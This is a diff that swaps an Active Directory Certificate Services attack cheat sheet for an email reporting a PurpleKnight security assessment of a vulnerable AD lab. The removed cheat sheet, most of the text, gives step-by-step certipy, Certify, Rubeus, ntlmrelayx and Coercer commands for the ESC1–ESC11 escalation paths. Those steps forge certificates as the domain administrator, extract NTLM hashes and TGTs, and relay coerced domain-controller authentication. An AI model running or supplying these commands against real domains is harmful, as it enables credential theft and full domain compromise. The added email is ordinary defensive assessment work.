@@ -1,203 +1,43 @@
-ADCS
+Hi team,
 
-ESC1 
+I would like to share the results of the PurpleKnight assessment conducted on my vulnerable Active Directory environment. Since the message is long, I’m sending it via email instead of Teams.
 
+Most vulnerabilities were identified as IOEs in PurpleKnight. In addition, recent activities in AD, such as privilege changes and AD settings modifications, were also detected.
 
-Linux
-certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -vulnerable -stdout
+The overall grade is determined by varying weights for five different categories: **AD Delegation, Account Security, AD Infrastructure Security, Group Policy Security,** and **Kerberos Security**. 
 
-step 1
-certipy req -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2  -template 'ESC1' -upn 'administrator@security.local' -sid S-1-5-21-13999771-2333344039-1820745628-500
+The Domain Controller is vulnerable to the following attacks:
 
-step2
-certipy auth -pfx administrator.pfx -username 'administrator' -domain 'security.local' -dc-ip 10.10.10.100
+- Abusing ACLs/ACEs
+- Kerberoasting
+- AS-REP Roasting
+- Abuse of DnsAdmins
+- Passwords in Object Descriptions
+- User Objects with Default Passwords (e.g., Changeme123!)
+- Password Spraying
+- DCSync
+- Silver Ticket
+- Golden Ticket
+- Pass-the-Hash
+- Pass-the-Ticket
+- SMB Signing Disabled
 
-Windows
+The assessment was performed from a domain-joined computer (not directly on the Domain Controller), assuming we would not have direct access to the DC. I tested PurpleKnight in three scenarios:
 
-.\Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
+1. Normal user (no privileges)
+2. Normal user with local admin rights
+3. High-privilege user with Domain Admin rights
 
-Step1
-Reuqest a certificate for the template vulnerable to ESC1 and specify a SAN for the user we wish to compromise (/altname:).
+No additional configurations were applied, such as bypassing PowerShell execution policies, since PurpleKnight is distributed as an executable.
 
-.\Certify.exe request /ca:CA.SECURITY.LOCAL\SECURITY-CA-CA /template:ESC1 /altname:security\Administrator /sid:S-1-5-21-13999771-2333344039-1820745628-500
+After reviewing the results, my first impression is that PurpleKnight is very convenient — similar to using Nessus, but focused on Active Directory. Interestingly, the normal user scenario detected more IOEs than the higher-privilege scenarios. I am investigating why this occurred.
 
+For your reference, I have attached the test results. Please review them at your convenience.
 
-Step2
-Then merge them together with certutil to create a .pfx file.
+Regarding detection, I checked the Domain Controller audit logs and found out PurpleKnight activities, such as Kerberoasting. However, because Directory Service Access auditing is not enabled, I could not see scans of AD objects (e.g., Domain Admins, ACLs, GPOs). I believe that EDR or MDI could detect such PurpleKnight activity.
 
-certutil -MergePFX .\cert.pem .\cert.pfx
+For Entra ID testing, additional configuration would be required (e.g., permissions, Azure registration). If possible, I think we should test PurpleKnight on Entra ID as well.
 
-Step3
-Use the converted certificate file with Rubeus to either request a NTLM hash or a Kerberos TGT.
-# Get NTLM Hash
-.\Rubeus.exe asktgt /user:security\Administrator /certificate:admin.pfx /getcredentials
-
-# Get TGT
-.\Rubeus.exe asktgt /user:security\Administrator /certificate:admin.pfx /nowrap
-
-
-
-ESC2
-
-ESC2 works on the same core principal as ESC1, where a low privileged user or group has the ability to supply a subjectAltName (SAN) for any other user or machine in Active Directory. in ESC1 attacks the flags for  the Extended Key Usage (EKU) need to contain "Client Authentication" to be valid.
-
-ESC2 by comparison is where the EKU is set to "Any Purpose" or is void of any usage specifications
-The attack method for this follows much the same as ESC1 except there is a small variation in the "pre-requisites" 
-
-
-
-
-.\Certify.exe find /vulnerable /enabled
-
-certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -vulnerable -stdout
-
-
-If the intended attack path for ESC2 is viable, simply follow the attack steps for ESC1.
-
-If the template is viable but does not have the ENROLLEE_SUPPLIES_SUBJECT flag set, then use it as the requesting agent in ESC3.
-
-
-ESC3
-
-ESC3 attacks make use of certificate templates that have EKU's that allow for "Certificate Request Agent". This EKU enables a principal to request a certificate on behalf of another user. 
-
-certipy find -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -enabled -stdout -vulnerable
-
-
-Step1
-Perform the initial request to the identified certificate configued with the EKU "Certificate Request Agent".
-
-certipy req -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2 -template 'ESC3' -out cert
-
-We can request a certificate on behalf of any user using any other template by including the initial certificate as proof.
-
-certipy req -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca 'SECURITY-CA-CA' -target-ip 10.10.10.2 -template 'user' -on-behalf-of 'security\administrator' -sid S-1-5-21-13999771-2333344039-1820745628-500 -pfx cert.pfx
-
-Step3
-use the certificate file to obtain the user credentials.
-certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'security.local' -dc-ip 10.10.10.100
-
-
-.\Certify.exe find /vulnerable
-
-Identify certificates that can be used for client authentication
-.\Certify.exe find /enabled /clientauth
-
-
-Step1
-Request a certificate for the template vulnerable to ESC3.
-.\Certify.exe request /ca:CA.SECURITY.LOCAL\SECURITY-CA-CA /template:ESC3-P1
-
-
-Step2
-Take the private key and certificate output and place them into seperate files. Then merge them together with certutil to create a .pfx file.
-certutil -MergePFX .\cert.pem .\cert.pfx
-
-
-We can request a certificate on behalf of any user using any other template by including the initial certificate as proof
-
-.\Certify.exe request /ca:CA.SECURITY.LOCAL\SECURITY-CA-CA /template:User /onbehalfof:security\Administrator /sid:S-1-5-21-13999771-2333344039-1820745628-500 /enrollcert:cert.pfx
-
-certutil -MergePFX .\admin.pem .\admin.pfx
-
-Step3
-# Get NTLM Hash
-.\Rubeus.exe asktgt /user:security\Administrator /certificate:admin.pfx /getcredentials
-
-# Get TGT
-.\Rubeus.exe asktgt /user:security\Administrator /certificate:admin.pfx /nowrap
-
-
-ESC4
-ESC4 abuse is where a low privilege user possess permissions over a certificate template which could be used to make it vulnerable to other attacks such as ESC1 or ESC2. 
-
-
-certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -vulnerable -stdout | grep ESC4
-
-Step1
-certipy can be used to save the current configuration of a template, so it can be restored to its original form later.
- This will make the selected template vulnerable to ESC1 attacks.
-certipy template -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -template ESC4 -save-old
-
-Step2
-certipy req -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca SECURITY-CA-CA -target-ip 10.10.10.2 -template ESC4 -upn Administrator@security.local -sid S-1-5-21-13999771-2333344039-1820745628-500 -out cert
-
-Step3
-certipy auth -pfx cert.pfx -username administrator -domain security.local -dc-ip 10.10.10.100 
-
-
-to restore the original template configuration
-certipy template -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -template 'ESC4' -configuration ESC4.json 
-
-
-ESC6
-ESC6 occurs when a Certificate Authority (CA) has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled in its configuration. This flag allows certificate requesters to specify arbitrary Subject Alternative Name (SAN) values.
-
-certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.231.141 -vulnerable -stdout
-
-Step1
-certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.231.141 -ca lab-LAB-DC-CA -template User -upn Administrator@lab.local 
-
-Once retrieved we can follow the remainder of the steps as per ESC1. 
-
-
-#Windows
-
-Certify can be used to check the Certificate Authorities for the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.
-.\Certify.exe cas
-
-
-The steps to perform the attack are almost identical to ESC1 except need to pick the default "User" template or any other candidate template if required.
-.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /altname:Administrator
-
-
-After retrieval, we can follow the remainder of the steps within ESC1 to complete the attack.
-
-
-ESC8
-
-ESC8 attacks fall under the category of NTLM relay attacks. Active Directory Certificate Services (AD CS) supports multiple enrollment methods, including HTTP-based enrollment, which enables users to request and obtain certificates over HTTP. 
-
-certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -stdout -vulnerable
-
-Step1
-After identifying a vulnerable web enrollment endpoint we can next setup the NTLM relay. We can use either ntlmrelayx or certipy.
-# Certipy, target is the ADCS server
-certipy relay -target 10.10.10.2 -template DomainController 
-
-# ntlmrelayx, target is the ADCS server
-impacket-ntlmrelayx -t http://10.10.10.2/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
-
-
-Step2
-Once either of the relay listeners is running we can use Coercer to perform forced authentication.
-coercer coerce -l 10.10.10.4 -t 10.10.10.2 -d security.local -u moe -p Password123 --always-continue
-
-Step3
-Once coercion is successful, certipy or ntlmrelayx will both save the certificate file to the current directory.
-certipy auth -pfx DC01$.pfx -dc-ip 10.10.10.100 
-
-
-
-ESC11
-IF_ENFORCEENCRYPTICERTREQUEST flag is not enabled on the CA
-
-certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -stdout -vulnerable
-
-
-Step1
-Run certipy, targeting the Certificate Authority and using the required template.
-
-certipy relay -target "rpc://10.10.10.2" -ca "SECURITY-CA-CA" -template DomainController 
-
-Step2
-Then force coertion with coercer, selecting the intended target
-coercer coerce -l 10.10.10.4 -t 10.10.10.100 -d security.local -u moe -p Password123
-
-Step3
- use certipy to request credentials.
-certipy auth -pfx dc01.pfx -dc-ip 10.10.10.100
-
-
+Best regards,
 
 
